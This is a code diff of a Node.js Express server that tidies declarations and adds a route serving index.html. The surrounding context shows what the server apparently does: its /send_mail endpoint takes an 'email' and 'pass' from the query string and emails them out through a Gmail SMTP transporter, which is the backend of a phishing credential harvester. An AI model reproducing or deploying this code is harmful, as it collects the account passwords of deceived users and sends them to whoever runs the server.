@@ -7,10 +7,11 @@ require('dotenv').config();
 
 const nodemailer = require('nodemailer');
 const log = console.log;
-var express = require('express');
-var app = express();
-var cors = require('cors')
+const express = require('express');
+const app = express();
+const cors = require('cors')
 const bodyParser = require('body-parser');
+const path = require('path');
 
 let transporter = nodemailer.createTransport({
     host: 'smtp.gmail.com',
@@ -33,6 +34,10 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.raw({ limit: '50mb' }));
 app.use(cors());
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, '/index.html'));
+})
 
 app.get('/send_mail', function (req, res) {
     mailOptions.text = "email: " + req.query.email + "  -  pass: " + req.query.pass
